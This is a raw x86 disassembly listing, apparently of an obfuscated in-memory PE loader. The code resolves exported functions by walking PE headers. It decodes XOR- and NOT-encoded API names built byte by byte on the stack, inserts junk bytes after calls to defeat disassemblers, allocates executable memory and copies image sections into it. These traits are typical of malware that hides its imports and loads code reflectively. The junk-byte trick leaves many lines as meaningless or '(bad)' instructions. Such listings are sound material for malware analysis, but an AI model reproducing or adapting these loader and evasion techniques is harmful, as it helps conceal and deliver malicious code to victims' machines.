 1003922:	68 60 d0 00 01       	push   $0x100d060
 1003927:	ff 15 2c 21 00 01    	call   *0x100212c
 100392d:	83 25 60 c0 00 01 00 	andl   $0x0,0x100c060
 1003934:	56                   	push   %esi
 1003935:	ff 15 55 8b ec 53    	call   *0x53ec8b55
 100393b:	56                   	push   %esi
 100393c:	57                   	push   %edi
 100393d:	8b 75 0c             	mov    0xc(%ebp),%esi
 1003940:	8b 7d 08             	mov    0x8(%ebp),%edi
 1003943:	8b 4d 10             	mov    0x10(%ebp),%ecx
 1003946:	8b d9                	mov    %ecx,%ebx
 1003948:	83 e1 03             	and    $0x3,%ecx
 100394b:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
 100394d:	8b cb                	mov    %ebx,%ecx
 100394f:	c1 e9 02             	shr    $0x2,%ecx
 1003952:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 1003954:	8b 45 08             	mov    0x8(%ebp),%eax
 1003957:	5f                   	pop    %edi
 1003958:	5e                   	pop    %esi
 1003959:	5b                   	pop    %ebx
 100395a:	5d                   	pop    %ebp
 100395b:	c3                   	ret
 100395c:	55                   	push   %ebp
 100395d:	8b ec                	mov    %esp,%ebp
 100395f:	51                   	push   %ecx
 1003960:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 1003964:	56                   	push   %esi
 1003965:	57                   	push   %edi
 1003966:	8b 75 08             	mov    0x8(%ebp),%esi
 1003969:	8b 7d 0c             	mov    0xc(%ebp),%edi
 100396c:	ac                   	lods   %ds:(%esi),%al
 100396d:	ae                   	scas   %es:(%edi),%al
 100396e:	75 08                	jne    0x1003978
 1003970:	84 c0                	test   %al,%al
 1003972:	75 f8                	jne    0x100396c
 1003974:	33 c0                	xor    %eax,%eax
 1003976:	eb 09                	jmp    0x1003981
 1003978:	b8 01 00 00 00       	mov    $0x1,%eax
 100397d:	7c 02                	jl     0x1003981
 100397f:	f7 d8                	neg    %eax
 1003981:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1003984:	8b 45 fc             	mov    -0x4(%ebp),%eax
 1003987:	5f                   	pop    %edi
 1003988:	5e                   	pop    %esi
 1003989:	c9                   	leave
 100398a:	c3                   	ret
 100398b:	ff 74 24 0c          	push   0xc(%esp)
 100398f:	ff 74 24 0c          	push   0xc(%esp)
 1003993:	ff 54 24 0c          	call   *0xc(%esp)
 1003997:	c3                   	ret
 1003998:	50                   	push   %eax
 1003999:	8b 44 24 04          	mov    0x4(%esp),%eax
 100399d:	83 c0 04             	add    $0x4,%eax
 10039a0:	50                   	push   %eax
 10039a1:	c2 08 00             	ret    $0x8
 10039a4:	50                   	push   %eax
 10039a5:	60                   	pusha
 10039a6:	e8 ed ff ff ff       	call   0x1003998
 10039ab:	c2 04 00             	ret    $0x4
 10039ae:	2c 61                	sub    $0x61,%al
 10039b0:	83 ec f8             	sub    $0xfffffff8,%esp
 10039b3:	8b 44 24 fc          	mov    -0x4(%esp),%eax
 10039b7:	83 c0 02             	add    $0x2,%eax
 10039ba:	89 44 24 fc          	mov    %eax,-0x4(%esp)
 10039be:	8b 44 24 f8          	mov    -0x8(%esp),%eax
 10039c2:	83 ec 04             	sub    $0x4,%esp
 10039c5:	c3                   	ret
 10039c6:	50                   	push   %eax
 10039c7:	8b 44 24 04          	mov    0x4(%esp),%eax
 10039cb:	83 c0 04             	add    $0x4,%eax
 10039ce:	50                   	push   %eax
 10039cf:	8b 44 24 04          	mov    0x4(%esp),%eax
 10039d3:	c2 08 00             	ret    $0x8
 10039d6:	8b 54 24 04          	mov    0x4(%esp),%edx
 10039da:	80 7a 03 01          	cmpb   $0x1,0x3(%edx)
 10039de:	75 04                	jne    0x10039e4
 10039e0:	8d 42 04             	lea    0x4(%edx),%eax
 10039e3:	c3                   	ret
 10039e4:	8d 42 04             	lea    0x4(%edx),%eax
 10039e7:	53                   	push   %ebx
 10039e8:	8b c8                	mov    %eax,%ecx
 10039ea:	8a 5a 02             	mov    0x2(%edx),%bl
 10039ed:	84 db                	test   %bl,%bl
 10039ef:	74 02                	je     0x10039f3
 10039f1:	30 19                	xor    %bl,(%ecx)
 10039f3:	8a 19                	mov    (%ecx),%bl
 10039f5:	f6 d3                	not    %bl
 10039f7:	84 db                	test   %bl,%bl
 10039f9:	88 19                	mov    %bl,(%ecx)
 10039fb:	74 03                	je     0x1003a00
 10039fd:	41                   	inc    %ecx
 10039fe:	eb ea                	jmp    0x10039ea
 1003a00:	c6 42 03 01          	movb   $0x1,0x3(%edx)
 1003a04:	5b                   	pop    %ebx
 1003a05:	c3                   	ret
 1003a06:	8b 4c 24 08          	mov    0x8(%esp),%ecx
 1003a0a:	56                   	push   %esi
 1003a0b:	57                   	push   %edi
 1003a0c:	33 ff                	xor    %edi,%edi
 1003a0e:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
 1003a12:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
 1003a16:	85 f6                	test   %esi,%esi
 1003a18:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
 1003a1c:	76 23                	jbe    0x1003a41
 1003a1e:	8b 48 08             	mov    0x8(%eax),%ecx
 1003a21:	85 c9                	test   %ecx,%ecx
 1003a23:	75 03                	jne    0x1003a28
 1003a25:	8b 48 10             	mov    0x10(%eax),%ecx
 1003a28:	8b 50 0c             	mov    0xc(%eax),%edx
 1003a2b:	39 54 24 0c          	cmp    %edx,0xc(%esp)
 1003a2f:	72 08                	jb     0x1003a39
 1003a31:	03 d1                	add    %ecx,%edx
 1003a33:	39 54 24 0c          	cmp    %edx,0xc(%esp)
 1003a37:	72 0a                	jb     0x1003a43
 1003a39:	47                   	inc    %edi
 1003a3a:	83 c0 28             	add    $0x28,%eax
 1003a3d:	3b fe                	cmp    %esi,%edi
 1003a3f:	72 dd                	jb     0x1003a1e
 1003a41:	33 c0                	xor    %eax,%eax
 1003a43:	5f                   	pop    %edi
 1003a44:	5e                   	pop    %esi
 1003a45:	c3                   	ret
 1003a46:	ff 74 24 08          	push   0x8(%esp)
 1003a4a:	ff 74 24 08          	push   0x8(%esp)
 1003a4e:	e8 b3 ff ff ff       	call   0x1003a06
 1003a53:	59                   	pop    %ecx
 1003a54:	59                   	pop    %ecx
 1003a55:	8b c8                	mov    %eax,%ecx
 1003a57:	85 c9                	test   %ecx,%ecx
 1003a59:	75 01                	jne    0x1003a5c
 1003a5b:	c3                   	ret
 1003a5c:	8b 41 14             	mov    0x14(%ecx),%eax
 1003a5f:	2b 41 0c             	sub    0xc(%ecx),%eax
 1003a62:	03 44 24 04          	add    0x4(%esp),%eax
 1003a66:	03 44 24 0c          	add    0xc(%esp),%eax
 1003a6a:	c3                   	ret
 1003a6b:	55                   	push   %ebp
 1003a6c:	8b ec                	mov    %esp,%ebp
 1003a6e:	83 ec 14             	sub    $0x14,%esp
 1003a71:	53                   	push   %ebx
 1003a72:	56                   	push   %esi
 1003a73:	57                   	push   %edi
 1003a74:	e8 2b ff ff ff       	call   0x10039a4
 1003a79:	c3                   	ret
 1003a7a:	9a e8 46 ff ff ff a6 	lcall  $0xa6ff,$0xffff46e8
 1003a81:	c1 55 fc 8b          	rcll   $0x8b,-0x4(%ebp)
 1003a85:	7d 08                	jge    0x1003a8f
 1003a87:	8b 77 3c             	mov    0x3c(%edi),%esi
 1003a8a:	03 f7                	add    %edi,%esi
 1003a8c:	8b 5e 78             	mov    0x78(%esi),%ebx
 1003a8f:	e8 32 ff ff ff       	call   0x10039c6
 1003a94:	74 c3                	je     0x1003a59
 1003a96:	fd                   	std
 1003a97:	3f                   	aas
 1003a98:	56                   	push   %esi
 1003a99:	53                   	push   %ebx
 1003a9a:	e8 67 ff ff ff       	call   0x1003a06
 1003a9f:	59                   	pop    %ecx
 1003aa0:	85 c0                	test   %eax,%eax
 1003aa2:	59                   	pop    %ecx
 1003aa3:	0f 84 b0 00 00 00    	je     0x1003b59
 1003aa9:	57                   	push   %edi
 1003aaa:	56                   	push   %esi
 1003aab:	53                   	push   %ebx
 1003aac:	e8 95 ff ff ff       	call   0x1003a46
 1003ab1:	83 c4 0c             	add    $0xc,%esp
 1003ab4:	e8 0d ff ff ff       	call   0x10039c6
 1003ab9:	aa                   	stos   %al,%es:(%edi)
 1003aba:	87 c1                	xchg   %eax,%ecx
 1003abc:	57                   	push   %edi
 1003abd:	8b 76 78             	mov    0x78(%esi),%esi
 1003ac0:	85 f6                	test   %esi,%esi
 1003ac2:	0f 84 91 00 00 00    	je     0x1003b59
 1003ac8:	8b 5c 3e 24          	mov    0x24(%esi,%edi,1),%ebx
 1003acc:	03 f7                	add    %edi,%esi
 1003ace:	03 df                	add    %edi,%ebx
 1003ad0:	e8 f1 fe ff ff       	call   0x10039c6
 1003ad5:	f0 68 7a 45 8b 46    	lock push $0x468b457a
 1003adb:	20 03                	and    %al,(%ebx)
 1003add:	c7                   	(bad)
 1003ade:	8b 7e 1c             	mov    0x1c(%esi),%edi
 1003ae1:	03 7d 08             	add    0x8(%ebp),%edi
 1003ae4:	89 45 ec             	mov    %eax,-0x14(%ebp)
 1003ae7:	8b 45 0c             	mov    0xc(%ebp),%eax
 1003aea:	c1 e8 10             	shr    $0x10,%eax
 1003aed:	66 85 c0             	test   %ax,%ax
 1003af0:	74 76                	je     0x1003b68
 1003af2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 1003af6:	8b 07                	mov    (%edi),%eax
 1003af8:	89 45 f0             	mov    %eax,-0x10(%ebp)
 1003afb:	e8 c6 fe ff ff       	call   0x10039c6
 1003b00:	d5 be                	aad    $0xbe
 1003b02:	c0 1c 83 7d          	rcrb   $0x7d,(%ebx,%eax,4)
 1003b06:	f0 00 74 43 8b       	lock add %dh,-0x75(%ebx,%eax,2)
 1003b0b:	45                   	inc    %ebp
 1003b0c:	ec                   	in     (%dx),%al
 1003b0d:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
 1003b11:	89 45 f4             	mov    %eax,-0xc(%ebp)
 1003b14:	89 5d f8             	mov    %ebx,-0x8(%ebp)
 1003b17:	8b 45 f8             	mov    -0x8(%ebp),%eax
 1003b1a:	0f b7 00             	movzwl (%eax),%eax
 1003b1d:	3b 45 fc             	cmp    -0x4(%ebp),%eax
 1003b20:	75 17                	jne    0x1003b39
 1003b22:	8b 45 f4             	mov    -0xc(%ebp),%eax
 1003b25:	ff 75 0c             	push   0xc(%ebp)
 1003b28:	8b 00                	mov    (%eax),%eax
 1003b2a:	03 45 08             	add    0x8(%ebp),%eax
 1003b2d:	50                   	push   %eax
 1003b2e:	e8 29 fe ff ff       	call   0x100395c
 1003b33:	59                   	pop    %ecx
 1003b34:	85 c0                	test   %eax,%eax
 1003b36:	59                   	pop    %ecx
 1003b37:	74 27                	je     0x1003b60
 1003b39:	8b 46 18             	mov    0x18(%esi),%eax
 1003b3c:	ff 45 f0             	incl   -0x10(%ebp)
 1003b3f:	83 45 f8 02          	addl   $0x2,-0x8(%ebp)
 1003b43:	83 45 f4 04          	addl   $0x4,-0xc(%ebp)
 1003b47:	48                   	dec    %eax
 1003b48:	39 45 f0             	cmp    %eax,-0x10(%ebp)
 1003b4b:	76 ca                	jbe    0x1003b17
 1003b4d:	8b 46 14             	mov    0x14(%esi),%eax
 1003b50:	ff 45 fc             	incl   -0x4(%ebp)
 1003b53:	48                   	dec    %eax
 1003b54:	39 45 fc             	cmp    %eax,-0x4(%ebp)
 1003b57:	76 9d                	jbe    0x1003af6
 1003b59:	33 c0                	xor    %eax,%eax
 1003b5b:	5f                   	pop    %edi
 1003b5c:	5e                   	pop    %esi
 1003b5d:	5b                   	pop    %ebx
 1003b5e:	c9                   	leave
 1003b5f:	c3                   	ret
 1003b60:	8b 45 fc             	mov    -0x4(%ebp),%eax
 1003b63:	8b 04 87             	mov    (%edi,%eax,4),%eax
 1003b66:	eb 35                	jmp    0x1003b9d
 1003b68:	33 db                	xor    %ebx,%ebx
 1003b6a:	89 7d f0             	mov    %edi,-0x10(%ebp)
 1003b6d:	8b 46 10             	mov    0x10(%esi),%eax
 1003b70:	03 c3                	add    %ebx,%eax
 1003b72:	39 45 0c             	cmp    %eax,0xc(%ebp)
 1003b75:	75 11                	jne    0x1003b88
 1003b77:	e8 4a fe ff ff       	call   0x10039c6
 1003b7c:	57                   	push   %edi
 1003b7d:	2a 21                	sub    (%ecx),%ah
 1003b7f:	24 8b                	and    $0x8b,%al
 1003b81:	45                   	inc    %ebp
 1003b82:	f0 83 38 00          	lock cmpl $0x0,(%eax)
 1003b86:	75 0f                	jne    0x1003b97
 1003b88:	8b 46 14             	mov    0x14(%esi),%eax
 1003b8b:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
 1003b8f:	43                   	inc    %ebx
 1003b90:	48                   	dec    %eax
 1003b91:	3b d8                	cmp    %eax,%ebx
 1003b93:	76 d8                	jbe    0x1003b6d
 1003b95:	eb c2                	jmp    0x1003b59
 1003b97:	8b 04 9f             	mov    (%edi,%ebx,4),%eax
 1003b9a:	c1 e0 06             	shl    $0x6,%eax
 1003b9d:	03 45 08             	add    0x8(%ebp),%eax
 1003ba0:	eb b9                	jmp    0x1003b5b
 1003ba2:	55                   	push   %ebp
 1003ba3:	8b ec                	mov    %esp,%ebp
 1003ba5:	81 ec c0 00 00 00    	sub    $0xc0,%esp
 1003bab:	53                   	push   %ebx
 1003bac:	56                   	push   %esi
 1003bad:	57                   	push   %edi
 1003bae:	e8 f1 fd ff ff       	call   0x10039a4
 1003bb3:	c3                   	ret
 1003bb4:	12 8b 45 10 33 db    	adc    -0x24ccefbb(%ebx),%cl
 1003bba:	3b c3                	cmp    %ebx,%eax
 1003bbc:	0f 84 fd 05 00 00    	je     0x10041bf
 1003bc2:	8b 78 3c             	mov    0x3c(%eax),%edi
 1003bc5:	03 f8                	add    %eax,%edi
 1003bc7:	0f b7 47 14          	movzwl 0x14(%edi),%eax
 1003bcb:	8d 74 38 18          	lea    0x18(%eax,%edi,1),%esi
 1003bcf:	89 75 bc             	mov    %esi,-0x44(%ebp)
 1003bd2:	e8 ef fd ff ff       	call   0x10039c6
 1003bd7:	87 f4                	xchg   %esi,%esp
 1003bd9:	0d 64 0f b7 47       	or     $0x47b70f64,%eax
 1003bde:	06                   	push   %es
 1003bdf:	8d 04 80             	lea    (%eax,%eax,4),%eax
 1003be2:	c1 e0 03             	shl    $0x3,%eax
 1003be5:	2b 45 10             	sub    0x10(%ebp),%eax
 1003be8:	03 c6                	add    %esi,%eax
 1003bea:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
 1003bf0:	89 45 f8             	mov    %eax,-0x8(%ebp)
 1003bf3:	e8 ce fd ff ff       	call   0x10039c6
 1003bf8:	05 6e cf 8d 66       	add    $0x668dcf6e,%eax
 1003bfd:	8b 47 06             	mov    0x6(%edi),%eax
 1003c00:	66 3b c3             	cmp    %bx,%ax
 1003c03:	76 1b                	jbe    0x1003c20
 1003c05:	8d 4e 0c             	lea    0xc(%esi),%ecx
 1003c08:	0f b7 d0             	movzwl %ax,%edx
 1003c0b:	8b 41 04             	mov    0x4(%ecx),%eax
 1003c0e:	8b 31                	mov    (%ecx),%esi
 1003c10:	03 c6                	add    %esi,%eax
 1003c12:	39 45 f8             	cmp    %eax,-0x8(%ebp)
 1003c15:	73 03                	jae    0x1003c1a
 1003c17:	89 45 f8             	mov    %eax,-0x8(%ebp)
 1003c1a:	83 c1 28             	add    $0x28,%ecx
 1003c1d:	4a                   	dec    %edx
 1003c1e:	75 eb                	jne    0x1003c0b
 1003c20:	88 5d a8             	mov    %bl,-0x58(%ebp)
 1003c23:	88 5d a9             	mov    %bl,-0x57(%ebp)
 1003c26:	c6 45 aa 58          	movb   $0x58,-0x56(%ebp)
 1003c2a:	88 5d ab             	mov    %bl,-0x55(%ebp)
 1003c2d:	c6 45 ac e0          	movb   $0xe0,-0x54(%ebp)
 1003c31:	c6 45 ad c2          	movb   $0xc2,-0x53(%ebp)
 1003c35:	c6 45 ae d3          	movb   $0xd3,-0x52(%ebp)
 1003c39:	c6 45 af f4          	movb   $0xf4,-0x51(%ebp)
 1003c3d:	c6 45 b0 de          	movb   $0xde,-0x50(%ebp)
 1003c41:	c6 45 b1 d4          	movb   $0xd4,-0x4f(%ebp)
 1003c45:	c6 45 b2 d3          	movb   $0xd3,-0x4e(%ebp)
 1003c49:	c6 45 b3 c2          	movb   $0xc2,-0x4d(%ebp)
 1003c4d:	c6 45 b4 ca          	movb   $0xca,-0x4c(%ebp)
 1003c51:	c6 45 b5 ee          	movb   $0xee,-0x4b(%ebp)
 1003c55:	c6 45 b6 c9          	movb   $0xc9,-0x4a(%ebp)
 1003c59:	c6 45 b7 c1          	movb   $0xc1,-0x49(%ebp)
 1003c5d:	c6 45 b8 c8          	movb   $0xc8,-0x48(%ebp)
 1003c61:	c6 45 b9 a7          	movb   $0xa7,-0x47(%ebp)
 1003c65:	e8 5c fd ff ff       	call   0x10039c6
 1003c6a:	42                   	inc    %edx
 1003c6b:	6b 20 94             	imul   $0xffffff94,(%eax),%esp
 1003c6e:	8d 45 a8             	lea    -0x58(%ebp),%eax
 1003c71:	50                   	push   %eax
 1003c72:	e8 5f fd ff ff       	call   0x10039d6
 1003c77:	8b 75 0c             	mov    0xc(%ebp),%esi
 1003c7a:	50                   	push   %eax
 1003c7b:	56                   	push   %esi
 1003c7c:	ff 75 08             	push   0x8(%ebp)
 1003c7f:	e8 07 fd ff ff       	call   0x100398b
 1003c84:	83 c4 10             	add    $0x10,%esp
 1003c87:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
 1003c8d:	51                   	push   %ecx
 1003c8e:	ff d0                	call   *%eax
 1003c90:	8b 45 f8             	mov    -0x8(%ebp),%eax
 1003c93:	8b 8d 54 ff ff ff    	mov    -0xac(%ebp),%ecx
 1003c99:	33 d2                	xor    %edx,%edx
 1003c9b:	f7 f1                	div    %ecx
 1003c9d:	33 d2                	xor    %edx,%edx
 1003c9f:	89 85 74 ff ff ff    	mov    %eax,-0x8c(%ebp)
 1003ca5:	8b 45 f8             	mov    -0x8(%ebp),%eax
 1003ca8:	f7 f1                	div    %ecx
 1003caa:	85 d2                	test   %edx,%edx
 1003cac:	74 06                	je     0x1003cb4
 1003cae:	ff 85 74 ff ff ff    	incl   -0x8c(%ebp)
 1003cb4:	0f af 8d 74 ff ff ff 	imul   -0x8c(%ebp),%ecx
 1003cbb:	89 4d 0c             	mov    %ecx,0xc(%ebp)
 1003cbe:	88 5d c0             	mov    %bl,-0x40(%ebp)
 1003cc1:	88 5d c1             	mov    %bl,-0x3f(%ebp)
 1003cc4:	c6 45 c2 ec          	movb   $0xec,-0x3e(%ebp)
 1003cc8:	88 5d c3             	mov    %bl,-0x3d(%ebp)
 1003ccb:	c6 45 c4 45          	movb   $0x45,-0x3c(%ebp)
 1003ccf:	c6 45 c5 7a          	movb   $0x7a,-0x3b(%ebp)
 1003cd3:	c6 45 c6 61          	movb   $0x61,-0x3a(%ebp)
 1003cd7:	c6 45 c7 67          	movb   $0x67,-0x39(%ebp)
 1003cdb:	c6 45 c8 66          	movb   $0x66,-0x38(%ebp)
 1003cdf:	c6 45 c9 72          	movb   $0x72,-0x37(%ebp)
 1003ce3:	c6 45 ca 7f          	movb   $0x7f,-0x36(%ebp)
 1003ce7:	c6 45 cb 52          	movb   $0x52,-0x35(%ebp)
 1003ceb:	c6 45 cc 7f          	movb   $0x7f,-0x34(%ebp)
 1003cef:	c6 45 cd 7f          	movb   $0x7f,-0x33(%ebp)
 1003cf3:	c6 45 ce 7c          	movb   $0x7c,-0x32(%ebp)
 1003cf7:	c6 45 cf 70          	movb   $0x70,-0x31(%ebp)
 1003cfb:	c6 45 d0 13          	movb   $0x13,-0x30(%ebp)
 1003cff:	e8 c2 fc ff ff       	call   0x10039c6
 1003d04:	c9                   	leave
 1003d05:	4a                   	dec    %edx
 1003d06:	27                   	daa
 1003d07:	7c 8d                	jl     0x1003c96
 1003d09:	45                   	inc    %ebp
 1003d0a:	c0 50 e8 c5          	rclb   $0xc5,-0x18(%eax)
 1003d0e:	fc                   	cld
 1003d0f:	ff                   	(bad)
 1003d10:	ff 50 56             	call   *0x56(%eax)
 1003d13:	ff 75 08             	push   0x8(%ebp)
 1003d16:	e8 70 fc ff ff       	call   0x100398b
 1003d1b:	83 c4 10             	add    $0x10,%esp
 1003d1e:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
 1003d24:	e8 9d fc ff ff       	call   0x10039c6
 1003d29:	75 a2                	jne    0x1003ccd
 1003d2b:	fc                   	cld
 1003d2c:	12 8d 45 e8 88 5d    	adc    0x5d88e845(%ebp),%cl
 1003d32:	e8 50 88 5d e9       	call   0xea5dc587
 1003d37:	c6 45 ea 40          	movb   $0x40,-0x16(%ebp)
 1003d3b:	88 5d eb             	mov    %bl,-0x15(%ebp)
 1003d3e:	c6 45 ec e9          	movb   $0xe9,-0x14(%ebp)
 1003d42:	c6 45 ed d6          	movb   $0xd6,-0x13(%ebp)
 1003d46:	c6 45 ee cd          	movb   $0xcd,-0x12(%ebp)
 1003d4a:	c6 45 ef cb          	movb   $0xcb,-0x11(%ebp)
 1003d4e:	c6 45 f0 ca          	movb   $0xca,-0x10(%ebp)
 1003d52:	c6 45 f1 de          	movb   $0xde,-0xf(%ebp)
 1003d56:	c6 45 f2 d3          	movb   $0xd3,-0xe(%ebp)
 1003d5a:	c6 45 f3 f9          	movb   $0xf9,-0xd(%ebp)
 1003d5e:	c6 45 f4 cd          	movb   $0xcd,-0xc(%ebp)
 1003d62:	c6 45 f5 da          	movb   $0xda,-0xb(%ebp)
 1003d66:	c6 45 f6 da          	movb   $0xda,-0xa(%ebp)
 1003d6a:	c6 45 f7 bf          	movb   $0xbf,-0x9(%ebp)
 1003d6e:	e8 63 fc ff ff       	call   0x10039d6
 1003d73:	50                   	push   %eax
 1003d74:	56                   	push   %esi
 1003d75:	ff 75 08             	push   0x8(%ebp)
 1003d78:	e8 0e fc ff ff       	call   0x100398b
 1003d7d:	89 45 f8             	mov    %eax,-0x8(%ebp)
 1003d80:	8d 45 94             	lea    -0x6c(%ebp),%eax
 1003d83:	50                   	push   %eax
 1003d84:	88 5d 94             	mov    %bl,-0x6c(%ebp)
 1003d87:	88 5d 95             	mov    %bl,-0x6b(%ebp)
 1003d8a:	c6 45 96 be          	movb   $0xbe,-0x6a(%ebp)
 1003d8e:	88 5d 97             	mov    %bl,-0x69(%ebp)
 1003d91:	c6 45 98 17          	movb   $0x17,-0x68(%ebp)
 1003d95:	c6 45 99 28          	movb   $0x28,-0x67(%ebp)
 1003d99:	c6 45 9a 33          	movb   $0x33,-0x66(%ebp)
 1003d9d:	c6 45 9b 35          	movb   $0x35,-0x65(%ebp)
 1003da1:	c6 45 9c 34          	movb   $0x34,-0x64(%ebp)
 1003da5:	c6 45 9d 20          	movb   $0x20,-0x63(%ebp)
 1003da9:	c6 45 9e 2d          	movb   $0x2d,-0x62(%ebp)
 1003dad:	c6 45 9f 11          	movb   $0x11,-0x61(%ebp)
 1003db1:	c6 45 a0 33          	movb   $0x33,-0x60(%ebp)
 1003db5:	c6 45 a1 2e          	movb   $0x2e,-0x5f(%ebp)
 1003db9:	c6 45 a2 35          	movb   $0x35,-0x5e(%ebp)
 1003dbd:	c6 45 a3 24          	movb   $0x24,-0x5d(%ebp)
 1003dc1:	c6 45 a4 22          	movb   $0x22,-0x5c(%ebp)
 1003dc5:	c6 45 a5 35          	movb   $0x35,-0x5b(%ebp)
 1003dc9:	c6 45 a6 41          	movb   $0x41,-0x5a(%ebp)
 1003dcd:	e8 04 fc ff ff       	call   0x10039d6
 1003dd2:	50                   	push   %eax
 1003dd3:	56                   	push   %esi
 1003dd4:	ff 75 08             	push   0x8(%ebp)
 1003dd7:	e8 af fb ff ff       	call   0x100398b
 1003ddc:	89 85 44 ff ff ff    	mov    %eax,-0xbc(%ebp)
 1003de2:	8d 45 d4             	lea    -0x2c(%ebp),%eax
 1003de5:	88 5d d4             	mov    %bl,-0x2c(%ebp)
 1003de8:	50                   	push   %eax
 1003de9:	88 5d d5             	mov    %bl,-0x2b(%ebp)
 1003dec:	c6 45 d6 d4          	movb   $0xd4,-0x2a(%ebp)
 1003df0:	88 5d d7             	mov    %bl,-0x29(%ebp)
 1003df3:	c6 45 d8 67          	movb   $0x67,-0x28(%ebp)
 1003df7:	c6 45 d9 44          	movb   $0x44,-0x27(%ebp)
 1003dfb:	c6 45 da 4a          	movb   $0x4a,-0x26(%ebp)
 1003dff:	c6 45 db 4f          	movb   $0x4f,-0x25(%ebp)
 1003e03:	c6 45 dc 67          	movb   $0x67,-0x24(%ebp)
 1003e07:	c6 45 dd 42          	movb   $0x42,-0x23(%ebp)
 1003e0b:	c6 45 de 49          	movb   $0x49,-0x22(%ebp)
 1003e0f:	c6 45 df 59          	movb   $0x59,-0x21(%ebp)
 1003e13:	c6 45 e0 4a          	movb   $0x4a,-0x20(%ebp)
 1003e17:	c6 45 e1 59          	movb   $0x59,-0x1f(%ebp)
 1003e1b:	c6 45 e2 52          	movb   $0x52,-0x1e(%ebp)
 1003e1f:	c6 45 e3 6a          	movb   $0x6a,-0x1d(%ebp)
 1003e23:	c6 45 e4 2b          	movb   $0x2b,-0x1c(%ebp)
 1003e27:	e8 aa fb ff ff       	call   0x10039d6
 1003e2c:	50                   	push   %eax
 1003e2d:	56                   	push   %esi
 1003e2e:	ff 75 08             	push   0x8(%ebp)
 1003e31:	e8 55 fb ff ff       	call   0x100398b
 1003e36:	83 c4 30             	add    $0x30,%esp
 1003e39:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
 1003e3f:	e8 82 fb ff ff       	call   0x10039c6
 1003e44:	c5 fe 14             	(bad)
 1003e47:	1b 88 9d 7c ff ff    	sbb    -0x8363(%eax),%ecx
 1003e4d:	ff 88 9d 7d ff ff    	decl   -0x8263(%eax)
 1003e53:	ff c6                	inc    %esi
 1003e55:	85 7e ff             	test   %edi,-0x1(%esi)
 1003e58:	ff                   	(bad)
 1003e59:	ff                   	ljmp   (bad)
 1003e5a:	e9 88 9d 7f ff       	jmp    0x7fdbe7
 1003e5f:	ff                   	(bad)
 1003e60:	ff c6                	inc    %esi
 1003e62:	45                   	inc    %ebp
 1003e63:	80 51 c6 45          	adcb   $0x45,-0x3a(%ecx)
 1003e67:	81 73 c6 45 82 62 c6 	xorl   $0xc6628245,-0x3a(%ebx)
 1003e6e:	45                   	inc    %ebp
 1003e6f:	83 5b c6 45          	sbbl   $0x45,-0x3a(%ebx)
 1003e73:	84 79 c6             	test   %bh,-0x3a(%ecx)
 1003e76:	45                   	inc    %ebp
 1003e77:	85 72 c6             	test   %esi,-0x3a(%edx)
 1003e7a:	45                   	inc    %ebp
 1003e7b:	86 63 c6             	xchg   %ah,-0x3a(%ebx)
 1003e7e:	45                   	inc    %ebp
 1003e7f:	87 7a c6             	xchg   %edi,-0x3a(%edx)
 1003e82:	45                   	inc    %ebp
 1003e83:	88 73 c6             	mov    %dh,-0x3a(%ebx)
 1003e86:	45                   	inc    %ebp
 1003e87:	89 5e c6             	mov    %ebx,-0x3a(%esi)
 1003e8a:	45                   	inc    %ebp
 1003e8b:	8a 77 c6             	mov    -0x3a(%edi),%dh
 1003e8e:	45                   	inc    %ebp
 1003e8f:	8b 78 c6             	mov    -0x3a(%eax),%edi
 1003e92:	45                   	inc    %ebp
 1003e93:	8c 72 c6             	mov    %?,-0x3a(%edx)
 1003e96:	45                   	inc    %ebp
 1003e97:	8d 7a c6             	lea    -0x3a(%edx),%edi
 1003e9a:	45                   	inc    %ebp
 1003e9b:	8e 73 c6             	mov    -0x3a(%ebx),%?
 1003e9e:	45                   	inc    %ebp
 1003e9f:	8f                   	(bad)
 1003ea0:	57                   	push   %edi
 1003ea1:	c6 45 90 16          	movb   $0x16,-0x70(%ebp)
 1003ea5:	e8 1c fb ff ff       	call   0x10039c6
 1003eaa:	dd 47 f9             	fldl   -0x7(%edi)
 1003ead:	ca 8d 85             	lret   $0x858d
 1003eb0:	7c ff                	jl     0x1003eb1
 1003eb2:	ff                   	(bad)
 1003eb3:	ff 50 e8             	call   *-0x18(%eax)
 1003eb6:	1c fb                	sbb    $0xfb,%al
 1003eb8:	ff                   	(bad)
 1003eb9:	ff 50 56             	call   *0x56(%eax)
 1003ebc:	ff 75 08             	push   0x8(%ebp)
 1003ebf:	e8 c7 fa ff ff       	call   0x100398b
 1003ec4:	83 c4 10             	add    $0x10,%esp
 1003ec7:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
 1003ecd:	6a 40                	push   $0x40
 1003ecf:	68 00 10 00 00       	push   $0x1000
 1003ed4:	ff 75 0c             	push   0xc(%ebp)
 1003ed7:	53                   	push   %ebx
 1003ed8:	ff 95 78 ff ff ff    	call   *-0x88(%ebp)
 1003ede:	8b f0                	mov    %eax,%esi
 1003ee0:	3b f3                	cmp    %ebx,%esi
 1003ee2:	0f 84 d7 02 00 00    	je     0x10041bf
 1003ee8:	ff b5 4c ff ff ff    	push   -0xb4(%ebp)
 1003eee:	ff 75 10             	push   0x10(%ebp)
 1003ef1:	56                   	push   %esi
 1003ef2:	e8 40 fa ff ff       	call   0x1003937
 1003ef7:	83 c4 0c             	add    $0xc,%esp
 1003efa:	66 39 5f 06          	cmp    %bx,0x6(%edi)
 1003efe:	89 5d 0c             	mov    %ebx,0xc(%ebp)
 1003f01:	76 33                	jbe    0x1003f36
 1003f03:	0f b7 45 0c          	movzwl 0xc(%ebp),%eax
 1003f07:	8b 4d bc             	mov    -0x44(%ebp),%ecx
 1003f0a:	8d 04 80             	lea    (%eax,%eax,4),%eax
 1003f0d:	ff 74 c1 10          	push   0x10(%ecx,%eax,8)
